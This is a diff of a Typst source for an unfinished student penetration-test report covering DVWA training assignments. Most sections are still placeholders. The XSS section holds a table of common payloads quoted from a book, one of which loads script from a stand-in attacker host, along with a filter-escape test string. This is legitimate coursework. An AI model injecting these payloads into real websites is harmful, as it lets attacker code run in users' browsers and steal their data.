@@ -23,7 +23,18 @@
 #set page(numbering: "1")
 #counter(page).update(1)
 
-= Executive Summary
+#heading(level: 1, numbering: none)[Executive Summary]
+
+#info("
+This is a copy-pasted guide from Moodle Announcements. TODO: remove before submitting the report.
+
+- primary follow the template suggested (not fully mandatory but the report should be similarly designed in all cases)
+- content and length can vary from student to student
+- no particular length, however, it is expected on average to be between 10 pages and 20 pages long
+- report  should not contain just screenshots, text is a mandatory part, including CVSS scoring (and anything CWE, CVE, CPE related)
+- should capture all the Assignments (1-7) you solved
+"
+)
 
 In this penetration test, Company X was examined for security-relevant weaknesses. The engagement followed a black-box methodology, meaning no internal implementation details were provided in advance. The scope of the assessment was as follows:
 
@@ -59,20 +70,6 @@ across all the assets of Company X. Solutions to remedy the discovered vulnerabi
 
 In this part add a short summary of all vulnerabilities in non-technical terms. It's also good to mention an estimation of efforts required to resolve the issues.
 
-= Vulnerability Overview
-
-Table @vuln-overview lists the vulnerabilities discovered during the penetration test. The ratings are grouped into low, medium, high, and critical to keep prioritization consistent across the report.
-
-#info(
-  "The severity model should be described here in the context of this assessment so that technical and non-technical readers can interpret the findings consistently."
-)
-
-
-#figure(
-  image("images/vuln_overview.png", width: 75%),
-  caption: [Vulnerability overview],
-) <vuln-overview-figure>
-
 #figure(
   table(
     columns: (auto, auto, 1fr, auto),
@@ -83,173 +80,82 @@ Table @vuln-overview lists the vulnerabilities discovered during the penetration
     table.header(
       [*Risk*], [*Asset*], [*Vulnerability*], [*Section*],
     ),
-    [#severity-badge("Critical")], [Domain 1], [Unauthenticated SQL Injection], [@issue-1],
-    [#severity-badge("High")], [Domain 1], [Stored XSS], [@issue-2],
-    [#severity-badge("Medium")], [Subdomain 1], [Balance manipulation during order confirmation], [@issue-3],
-    [#severity-badge("Low")], [Subdomain 2], [Mail server misconfiguration], [@issue-4],
+    [#severity-badge("Critical")], [Assignment 1], [Something here], [@assignment-1],
+    [#severity-badge("High")], [Assignment 2], [Dunno What Goes here], [@assignment-2],
+    [#severity-badge("Medium")], [Assignment 3], [Content needed here too], [@assignment-3],
+    [#severity-badge("Low")], [Assignment 4], [todo], [@assignment-4],
   ),
   caption: [Vulnerability overview],
 ) <vuln-overview>
 
-= Results
 
-This chapter presents the vulnerabilities found during the penetration test. Findings are grouped by target and include the following information:
+#counter(heading).update(0)
 
-- Brief description
-- CVSS base score
-- Exploitability
-- Business impact
-- References to classifications such as WASC, OWASP, and CWE
-- Steps to reproduce
-- Remediation guidance
+= Assignment: DVWA XSS
 
-#info("Also the remediation recommendations are given for each issue found during the
-penetration test. Both \"quick win\" and long term solutions are presented as well as
-some code examples.")
+== Overview and Definitions
 
-== Domain 1
+I used the following sources to complete the DVWA XSS assignment:
 
-System description goes here.
+- Bug Bounty Bootcamp by Vickie Li (No Starch Press, 2021) Chapter 6: Cross-Site Scripting
 
-*Hostname:* https://example.com
+The heading has two abbreviations: XSS (Cross-Site Scripting) and CVSS (Common Vulnerability Scoring System). Vickie Li explain XSS as _"An XSS vulnerability occurs when attackers can execute custom scripts on a victim's browser."_DVWA (Damn Vulnerable Web Application) is a deliberately vulnerable web application used for security training and testing. It can be found at \url{https://github.com/digininja/DVWA}. Based on the repository README, it seems to run a typical LAMP stack (Linux, Apache, MySQL, PHP). The documentation even points to a YouTube video, where a solution is shown: \url{https://youtu.be/V4MATqtdxss?si=EMHoRvfZz_vI-v14}[Finding and exploiting reflected XSS in DVWA].
 
-*Server IP address:* 127.0.0.1
-
-=== Unauthenticated SQL Injection <issue-1>
-
-General vulnerability description goes here.
-
-Basic information about this issue is presented in table @issue-1-table.
+Obviously, the KYBS2001 hosted exercise might be hardened somehow so that the exercise is not that trivial. This is essentially the scope of this penetration test experiment. Vickie Li lists a couple of common XSS payloads, which are in the table below.
 
 #figure(
-  issue-table(
-    [Description goes here.],
-    [8.0],
-    [High],
-    [Business impact goes here.],
-    [[WASC, OWASP]],
-    [Affected input goes here.],
-    [
-      - Output 1
-      - Output 2
-    ],
+  table(
+    columns: (auto, auto),
+    stroke: 0.6pt + rgb("#D1D5DB"),
+    inset: 7pt,
+    fill: (_, y) => if y == 0 { rgb("#d6e0f5") },
+    table.header(
+      [*Payload*], [*Description*],
+    ),
+    [`<script>alert(1)</script>`], [Most generic XSS payload],
+    [`<iframe src=javascript:alert(1)>`], [Useful when script tags are filtered but iframes are not],
+    [`<body onload=alert(1)>`], [Another way to go around the script tag filter],
+    [`"><img src=x onerror=prompt(1);>`], [Closes previous tag and inject the code as image error handler],
+    [`<script>alert(1)<!–`], [Bypass filters that look for closing script tags],
+    [`<a onmouseover"alert(1)">test</a>`], [Trigger XSS on mouseover event],
+    [`<script src=//attacker.com/test.js>`], [Run code hosted on attacker's server],
   ),
-  caption: [Issue #1: description of the issue],
-) <issue-1-table>
+  caption: [Common XSS payloads],
+) <xss-payloads>
 
-==== Minimal Proof of Concept
+According to Li, a good XSS escape test string would be `>'<"//:=;!--`.
 
-Steps to reproduce the issue go here. Screenshots are welcome.
+== Assignment Solution
 
-==== Proposed Solutions
+TODO
 
-Proposed solution to the issue goes here.
+= Assignment: DVWA Command Execution (Injection) <assignment-1>
 
-=== Stored XSS <issue-2>
+This section will document the DVWA command execution assignment, including the vulnerable input path, exploitation method, resulting impact, and recommended fixes.
 
-General information about persistent XSS attacks goes here.
+= Assignment: DVWA File Upload <assignment-2>
 
-Basic information about this issue is presented in table @issue-2-table.
+This section will document the DVWA file upload assignment, including the upload weakness, validation gaps, proof of exploitation, and mitigation steps.
 
-#figure(
-  issue-table(
-    [Description goes here.],
-    [8.0],
-    [High],
-    [Business impact goes here.],
-    [[WASC, OWASP]],
-    [Input.],
-    [
-      - Output 1
-      - Output 2
-    ],
-  ),
-  caption: [Issue #2: description of the issue],
-) <issue-2-table>
+= Assignment: DVWA File Inclusion <assignment-3>
 
-==== Minimal Proof of Concept
+This section will document the DVWA file inclusion assignment, including the affected functionality, inclusion technique, security consequences, and remediation guidance.
 
-Steps to reproduce the issue go here. Screenshots are welcome.
+= Assignment: DVWA SQL Injection without randomization <assignment-4>
 
-==== Proposed Solutions
+This section will document the DVWA SQL injection assignment without randomization, including the injection point, extraction approach, impact assessment, and defensive measures.
 
-Proposed solution to the issue goes here.
+= Assignment: DVWA Brute-Force Login <assignment-5>
 
-== Subdomain 1
+This section will document the DVWA brute-force login assignment, including the authentication weakness, attack workflow, impact on account security, and hardening recommendations.
 
-System description goes here.
+= Assignment: NMAP scan <assignment-6>
 
-*Hostname:* https://1.example.com
+This section will document the NMAP scanning assignment, including the scan scope, identified services, notable exposure points, and follow-up observations.
 
-*Server IP address:* 127.0.0.1
+= Extra Activity: Mini-LAB for Pentesting <assignment-extra>
 
-=== Balance Manipulation During Order Confirmation <issue-3>
-
-General vulnerability description goes here.
-
-Basic information about this issue is presented in table @issue-3-table.
-
-#figure(
-  issue-table(
-    [Description goes here.],
-    [8.0],
-    [High],
-    [Business impact goes here.],
-    [[WASC, OWASP]],
-    [Affected input goes here.],
-    [
-      - Output 1
-      - Output 2
-    ],
-  ),
-  caption: [Issue #3: description of the issue],
-) <issue-3-table>
-
-==== Minimal Proof of Concept
-
-Steps to reproduce the issue go here. Screenshots are welcome.
-
-==== Proposed Solutions
-
-Proposed solution to the issue goes here.
-
-== Subdomain 2
-
-System description goes here.
-
-*Hostname:* https://2.example.com
-
-*Server IP address:* 127.0.0.1
-
-=== Mail Server Misconfiguration <issue-4>
-
-General vulnerability description goes here.
-
-Basic information about this issue is presented in table @issue-4-table.
-
-#figure(
-  issue-table(
-    [Description goes here.],
-    [8.0],
-    [High],
-    [Business impact goes here.],
-    [[WASC, OWASP]],
-    [Affected input goes here.],
-    [
-      - Output 1
-      - Output 2
-    ],
-  ),
-  caption: [Issue #4: description of the issue],
-) <issue-4-table>
-
-==== Minimal Proof of Concept
-
-Steps to reproduce the issue go here. Screenshots are welcome.
-
-==== Proposed Solutions
-
-Proposed solution to the issue goes here.
+This section will document the Mini-LAB for Pentesting extra activity, including the environment summary, key findings, practical steps performed, and relevant lessons learned.
 
 = Appendices
 
